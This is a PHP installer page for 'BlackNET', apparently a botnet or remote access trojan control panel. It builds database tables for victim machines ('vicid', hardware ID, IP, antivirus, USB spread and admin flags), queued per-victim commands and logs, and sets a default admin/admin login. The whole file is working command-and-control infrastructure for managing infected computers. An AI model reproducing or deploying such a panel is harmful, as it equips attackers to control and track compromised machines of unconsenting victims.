<?php
include_once 'classes/Database.php';
include_once 'classes/Update.php';

$datbase = new Database;

$install = new Update;

$required_libs = ["cURL" => "curl", "JSON" => "json", "PDO" => "pdo", "MySQL" => "pdo_mysql", "Mbstring" => "mbstring"];
$is_installed = [];

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $admin = [
        ["id", 'int(11)', 'unsigned', 'NOT NULL'],
        ["username", 'text', 'NOT NULL'],
        ["password", 'text', 'NOT NULL'],
        ["email", 'text', 'NOT NULL'],
        ["role", 'varchar(50)', 'NOT NULL'],
        ["s2fa", 'varchar(10)', 'NOT NULL'],
        ["secret", 'varchar(50)', 'NOT NULL'],
        ["sqenable", 'varchar(50)', 'NOT NULL'],
        ["question", 'text', 'NOT NULL'],
        ["answer", 'text', 'NOT NULL'],
        ['last_login', 'timestamp', 'NOT NULL', "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
        ["failed_login", "int(11)", "NOT NULL"],
    ];

    $clients = [
        ["id", 'int(11)', 'unsigned', 'NOT NULL'],
        ["vicid", 'text', 'NOT NULL'],
        ["hwid", 'text', 'NOT NULL'],
        ["ipaddress", 'text', 'NOT NULL'],
        ["computername", 'text', 'NOT NULL'],
        ["country", 'text', 'NOT NULL'],
        ["os", 'text', 'NOT NULL'],
        ["insdate", 'text', 'NOT NULL'],
        ["update_at", 'text', 'NOT NULL'],
        ["pings", 'int(11)', 'NOT NULL'],
        ['antivirus', 'text', 'NOT NULL'],
        ['version', 'text', 'NOT NULL'],
        ['status', 'text', 'NOT NULL'],
        ['is_usb', 'varchar(5)', 'NOT NULL'],
        ["is_admin", 'varchar(5)', "NOT NULL"],
    ];

    $commands = [
        ["id", 'int(11)', 'unsigned', 'NOT NULL'],
        ["vicid", 'text', 'NOT NULL'],
        ["command", 'text', 'NOT NULL'],
    ];

    $confirm_code = [
        ["id", 'int(11)', 'unsigned', 'NOT NULL'],
        ["username", 'text', 'NOT NULL'],
        ["token", 'text', 'NOT NULL'],
        ["created_at", 'timestamp', 'NOT NULL', "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
    ];

    $logs = [
        ["id", 'int(11)', 'unsigned', 'NOT NULL'],
        ["time", 'timestamp', 'NOT NULL', "DEFAULT CURRENT_TIMESTAMP", "ON UPDATE CURRENT_TIMESTAMP()"],
        ["vicid", 'text', 'NOT NULL'],
        ["type", 'text', 'NOT NULL'],
        ["message", 'text', 'NOT NULL'],
    ];

    $settings = [
        ["id", 'int(11)', 'unsigned', 'NOT NULL'],
        ["recaptchaprivate", 'text', 'NOT NULL'],
        ["recaptchapublic", 'text', 'NOT NULL'],
        ["recaptchastatus", 'text', 'NOT NULL'],
        ["panel_status", 'text', 'NOT NULL'],
    ];

    $smtp = [
        ["id", 'int(11)', 'unsigned', 'NOT NULL'],
        ["smtphost", 'text', 'NOT NULL'],
        ["smtpuser", 'text', 'NOT NULL'],
        ["smtppassword", 'text', 'NOT NULL'],
        ["port", 'int(11)', 'NOT NULL'],
        ["security_type", 'varchar(10)', 'NOT NULL'],
        ["status", 'varchar(50)', 'NOT NULL'],
    ];

    $sql = [
        $install->create_table("admin", $admin),
        $install->create_table("clients", $clients),
        $install->create_table("commands", $commands),
        $install->create_table("confirm_code", $confirm_code),
        $install->create_table("logs", $logs),
        $install->create_table("settings", $settings),
        $install->create_table("smtp", $smtp),
        $install->insert_value("admin", [
            "id" => 1,
            "username" => 'admin',
            "password" => '63cd16726f1b56ef120d5c1ddffaed3e3d472af6dabc5914a93b55cf30ca284d',
            "email" => 'localhost@gmail.com',
            "role" => 'administrator',
            "s2fa" => 'off',
            "secret" => 'null',
            "sqenable" => 'off',
            "question" => 'Select a Security Question',
            "answer" => '',
            "last_login" => "2020-05-11 01:19:22",
            "failed_login" => 0,
        ]),
        $install->insert_value("settings", [
            "id" => 1,
            "recaptchaprivate" => 'UpdateYourCode',
            "recaptchapublic" => 'UpdateYourCode',
            "recaptchastatus" => 'off',
            "panel_status" => 'on',
        ]),
        $install->insert_value("smtp", [
            "id" => 1,
            "smtphost" => 'smtp.localhost.com',
            "smtpuser" => 'localhost@gmail.com',
            "smtppassword" => 'Z21haWxwYXNzd29yZA==',
            "port" => 0,
            "security_type" => 'ssl',
            "status" => 'off',
        ]),
        $install->is_primary("admin", "id"),
        $install->is_autoinc("admin", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
        $install->is_primary("clients", "id"),
        $install->is_autoinc("clients", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
        $install->is_primary("commands", "id"),
        $install->is_autoinc("commands", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
        $install->is_primary("confirm_code", "id"),
        $install->is_autoinc("confirm_code", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
        $install->is_primary("logs", "id"),
        $install->is_autoinc("logs", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
        $install->is_primary("settings", "id"),
        $install->is_autoinc("settings", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
        $install->is_primary("smtp", "id"),
        $install->is_autoinc("smtp", ["id", 'int(11)', 'unsigned', 'NOT NULL']),
    ];

    foreach ($sql as $query) {
        $msg = $install->execute($query);
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <?php include_once 'components/meta.php';?>
  <title>BlackNET - Installation</title>
  <?php include_once 'components/css.php';?>
</head>

<body class="bg-dark">
  <div class="container pt-3">
    <div class="card card-login mx-auto mt-5">
      <div class="card-header">Install</div>
      <div class="card-body">
        <form method="POST">
          <?php if (isset($msg)): ?>
            <div class="alert alert-success"><span class="fas fa-check-circle"></span> Panel has been installed.</div>
          <?php endif;?>
          <div class="alert alert-primary text-center border-primary">
            <p class="lead h2">
              <b>this page going to install BlackNET default settings<br>
                <hr>
                <div>
                <?php foreach ($required_libs as $common_name => $lib_name): ?>
                <?php echo $common_name . ": ", extension_loaded($lib_name) ? "OK" : "Missing", "<br />"; ?>
                <?php array_push($is_installed, extension_loaded($lib_name));?>
                <?php endforeach;?>
                </div>
                <hr>
                <p class="h3">admin login details</p>
                <ul class="list-unstyled h4">
                  <li class="">Username: admin</li>
                  <li class="">Password: admin</li>
                </ul>
                <hr />
                <p>Please change the admin information for better security.</p>
              </b></p>
          </div>
          <?php if (in_array(false, $is_installed)): ?>
          <button type="submit" class="btn btn-primary btn-block" disabled>Start Installation</button>
          <?php else: ?>
          <button type="submit" class="btn btn-primary btn-block">Start Installation</button>
          <?php endif;?>
        </form>
      </div>
    </div>
  </div>
  <?php include_once 'components/js.php';?>

</body>

</html>
